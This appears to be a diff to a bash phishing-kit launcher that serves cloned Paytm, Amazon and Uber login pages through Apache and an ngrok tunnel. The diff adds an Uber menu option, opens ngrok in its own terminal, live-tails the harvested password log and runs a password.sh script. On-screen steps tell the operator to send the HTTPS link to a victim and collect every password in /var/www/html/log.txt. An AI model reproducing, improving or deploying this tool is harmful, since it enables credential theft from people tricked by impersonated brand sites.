@@ -30,6 +30,7 @@ red='\e[1;31m'
 yellow='\e[1;33m' 
 printf "        \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Paytm\e[0m\n"
 printf "        \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;37m]\e[0m\e[1;37m Amazone\e[0m\n"
+printf "        \e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Uber\e[0m\n"
 
 
 echo -e $white "Enter your Choice"
@@ -52,7 +53,8 @@ case $Choice in
 		cp -R ngrok /var/www/html/
 		cd paytm/
 		cp -R * /var/www/html/
-		cp password.sh /var/www/html/
+		cd ..
+                cp -R password.sh /var/www/html/
 		cd /var/www/html/
 		chmod +x *
 		chmod 7777 *
@@ -62,9 +64,10 @@ case $Choice in
 		printf "                                \e[210m\e[1;99m ALERT +++++++++++++++++++++ Step 1 - Send Https Link on Victim +++++++++++ \e[0m\n"
 		printf "                                \e[210m\e[1;99m ALERT +++++++++++++++++++++ Step 2 - All Password save on /var/www/html/log.txt ++++++++++++++ \e[0m\n"
 		sleep 11
-		./ngrok http 80
-		cd /var/www/html/
-		gedit log.txt
+		gnome-terminal -x bash -c "./ngrok http 80; exec bash"
+                cd /var/www/html/
+	        xterm -hold -e tail -f log.txt
+		./password.sh
 		;;
 	        2) sudo apt-get install apache2
 		hostnamectl
@@ -78,7 +81,8 @@ case $Choice in
 		cp -R ngrok /var/www/html/
 		cd signup/
 		cp -R * /var/www/html/
-		cp password.sh /var/www/html/
+		cd ..
+		cp -R password.sh /var/www/html/
 		cd /var/www/html/
 		chmod +x *
 		chmod 7777 *
@@ -86,9 +90,10 @@ case $Choice in
 		printf "                                                     \e[210m\e[1;99m ALERT ++++++++++++++++++++ Step 1 - Send Https Link on Victim +++++++++++++ \e[0m\n"
 		printf "                                                     \e[210m\e[1;99m ALERT ++++++++++++++++++++ Step 2 - All Password Sve on /var/www/html/log.txt ++++++++++++++ \e[0m\n"
 		sleep 11
-		./ngrok http 80 
-		cd /var/www/html/
-		gedit log.txt
+		gnome-terminal -x bash -c "./ngrok http 80; exec bash"
+                cd /var/www/html/
+		xterm -hold -e tail -f log.txt
+		./password.sh
 		;;
                 esac
                 ;;
@@ -105,8 +110,8 @@ case $Choice in
 		cp -R ngrok /var/www/html/
 		cd amazone/
 		cp -R * /var/www/html/
-		cp -R password.sh /var/www/html/
-		cp password.sh /var/www/html/
+		cd ..
+                cp -R password.sh /var/www/html/
 		cd /var/www/html/
 		chmod +x *
 		chmod 7777 *
@@ -114,10 +119,15 @@ case $Choice in
 		printf "                                                                                                                                                                                                                         \e[101m\e[1;77m ALERT +++++++++++++++++++ Step 1 - Send Https Link on Victim ++++++++++++++++ \e[0m\n"
 		printf "                                                                                                                                                                                                                         \e[101m\e[1;77m ALERT +++++++++++++++++++ Step 2 - All Password Save on /var/www/html/log.txt ++++++++++++ \e[0m\n"
 		sleep 11
-		./ngrok http 80
+		gnome-terminal -x bash -c "./ngrok http 80; exec bash"
                 cd /var/www/html/
-		gedit log.txt
+		xterm -hold -e tail -f log.txt
+		./password.sh
 		;;
+	3)printf ""
+		echo "hi"
+		;;
+                
 	
 esac
 
